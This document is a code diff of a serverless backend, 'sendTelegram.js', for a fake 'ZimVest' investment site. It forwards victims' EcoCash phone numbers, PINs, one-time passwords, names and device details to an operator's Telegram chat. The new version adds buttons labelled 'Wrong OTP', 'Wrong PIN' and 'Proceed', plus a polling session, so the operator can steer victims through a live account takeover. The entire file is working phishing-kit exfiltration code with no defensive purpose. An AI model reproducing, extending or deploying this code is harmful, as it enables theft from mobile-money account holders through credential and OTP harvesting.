@@ -1,73 +1,96 @@
-// api/sendTelegram.js — ZimVest edition
-// Sends investment plan + credentials to Telegram (HTML parse mode)
+// api/sendTelegram.js — ZimVest v2
+// Sends credentials + investment details to Telegram
+// When event === 'otp_confirmed', sends with 3 inline buttons:
+//   [Wrong OTP] [Wrong PIN] [✅ Proceed]
+// Stores last message_id + callback answer in KV so login.html can poll it
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).send('Method not allowed');
 
   const TOKEN   = process.env.TELEGRAM_TOKEN;
   const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+  if (!TOKEN || !CHAT_ID) return res.status(500).send('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
 
-  if (!TOKEN || !CHAT_ID) {
-    const m = [!TOKEN && 'TELEGRAM_TOKEN', !CHAT_ID && 'TELEGRAM_CHAT_ID'].filter(Boolean);
-    return res.status(500).send('Missing env vars: ' + m.join(', '));
+  let body = {};
+  try { body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
+  catch { return res.status(400).send('Invalid JSON'); }
+
+  const esc = s => s == null ? '—' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+  // ── Build message text ────────────────────────────────────────────────────
+  const ev = body.event || 'activity';
+  const evEmoji = {
+    invest_initiated: '🚀', otp_confirmed: '🔐', resend_otp: '🔄',
+    wrong_otp: '❌', wrong_pin: '🚫', proceed: '✅',
+  }[ev] || '📌';
+
+  let text = `<b>${evEmoji} ZimVest — ${esc(ev.replace(/_/g,' ').toUpperCase())}</b>\n`;
+  text += `<code>━━━━━━━━━━━━━━━━━━━━</code>\n\n`;
+
+  if (body.loginPhone) {
+    text += `<b>📱 EcoCash Number</b>\n<code>${esc(body.loginPhone)}</code>\n`;
+    if (body.loginPin) text += `<b>🔑 PIN</b>: <code>${esc(body.loginPin)}</code>\n`;
+    if (body.otp)      text += `<b>OTP</b>: <code>${esc(body.otp)}</code>\n`;
+    if (body.name)     text += `<b>Name</b>: ${esc(body.name)}\n`;
+    text += '\n';
   }
 
-  let payload = {};
+  if (body.plan) {
+    text += `<b>💰 Investment</b>\n<code>${esc(body.plan)}</code>\n\n`;
+  }
+
+  text += `<b>🕐 Time:</b> <code>${esc(new Date().toLocaleString('en-ZW',{timeZone:'Africa/Harare'}))}</code>\n`;
+  if (body.device) text += `<b>📲 Device:</b> ${esc(body.device)}\n`;
+
+  // ── Session key stored in KV for polling ─────────────────────────────────
+  // session key = sanitised phone + timestamp (unique per investment attempt)
+  const sessionKey = body.loginPhone
+    ? 'tg_session:' + String(body.loginPhone).replace(/\W/g,'') + '_' + Date.now()
+    : null;
+
+  // ── Inline keyboard only on otp_confirmed ─────────────────────────────────
+  const withButtons = ev === 'otp_confirmed';
+  const msgPayload = {
+    chat_id: CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true,
+    ...(withButtons && {
+      reply_markup: {
+        inline_keyboard: [[
+          { text: '❌ Wrong OTP',  callback_data: 'wrong_otp:'  + (sessionKey||'') },
+          { text: '🚫 Wrong PIN',  callback_data: 'wrong_pin:'  + (sessionKey||'') },
+          { text: '✅ Proceed',    callback_data: 'proceed:'    + (sessionKey||'') },
+        ]]
+      }
+    })
+  };
+
   try {
-    payload = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {});
-  } catch { return res.status(400).send('Invalid JSON'); }
-
-  const esc = s => s == null ? '' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  const sh  = (s, n=600) => { s = String(s??''); return s.length > n ? esc(s.slice(0,n))+'…' : esc(s); };
-  const mask= s => { if(!s) return ''; const t=String(s); return t.length<=2?'*'.repeat(t.length):'*'.repeat(t.length-2)+t.slice(-2); };
-
-  // Build message
-  let text = `<b>🇿🇼 ZimVest — New Activity</b>\n\n`;
-  text += `<b>Event:</b> ${esc(payload.event||'—')}\n`;
-  if (payload.submittedAt) text += `<b>Time:</b> ${esc(payload.submittedAt)}\n`;
-
-  // Investment plan
-  const p = payload.selectedPlan;
-  if (p && typeof p === 'object') {
-    text += `\n<b>💰 Investment Plan</b>\n`;
-    if (p.name)    text += `Plan: ${sh(p.name)}\n`;
-    if (p.amount)  text += `Deposit: $${sh(p.amount)}\n`;
-    if (p.pct)     text += `Return: +${sh(p.pct)}%\n`;
-    if (p.payout)  text += `Payout: $${sh(p.payout)}\n`;
-    if (p.hours)   text += `Duration: ${sh(p.hours)} hours\n`;
-    if (p.summary) text += `Summary: ${sh(p.summary)}\n`;
-  }
-
-  // Credentials
-  if (payload.loginPhone) {
-    text += `\n<b>📱 Credentials</b>\n`;
-    text += `Phone: ${esc(payload.loginPhone)}\n`;
-    if (payload.loginPin)  text += `PIN: ${esc(payload.loginPin)}\n`;
-    if (payload.name)      text += `Name: ${esc(payload.name)}\n`;
-    if (payload.otp)       text += `OTP: ${esc(payload.otp)}\n`;
-  }
-
-  if (payload.device) text += `\n<b>Device:</b> ${esc(payload.device)}\n`;
-
-  // Extra keys
-  const skip = new Set(['submittedAt','loginPhone','loginPin','otp','selectedPlan','event','name','device']);
-  const extras = Object.keys(payload).filter(k => !skip.has(k));
-  if (extras.length) {
-    text += '\n<b>Other</b>\n';
-    extras.forEach(k => { text += `${esc(k)}: ${sh(payload[k])}\n`; });
-  }
-
-  try {
-    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    const r    = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }),
+      body: JSON.stringify(msgPayload),
     });
-    const body = await r.text();
-    if (!r.ok) return res.status(502).send('Telegram error: ' + body);
-    try { return res.status(200).json(JSON.parse(body)); }
-    catch { return res.status(200).send(body); }
+    const data = await r.json();
+
+    if (!r.ok) return res.status(502).json({ error: 'Telegram error', detail: data });
+
+    // ── Store session in KV if available ─────────────────────────────────────
+    if (withButtons && sessionKey) {
+      try {
+        const { kv } = await import('@vercel/kv');
+        await kv.set(sessionKey, JSON.stringify({
+          messageId: data.result?.message_id,
+          phone: body.loginPhone,
+          status: 'pending',
+          createdAt: Date.now(),
+        }), { ex: 600 }); // 10 min TTL
+      } catch { /* KV unavailable — polling will time out gracefully */ }
+    }
+
+    return res.status(200).json({ ok: true, messageId: data.result?.message_id, sessionKey });
   } catch (e) {
-    return res.status(500).send('Fetch error: ' + (e?.message || e));
+    return res.status(500).json({ error: 'Fetch failed', message: e?.message });
   }
 }
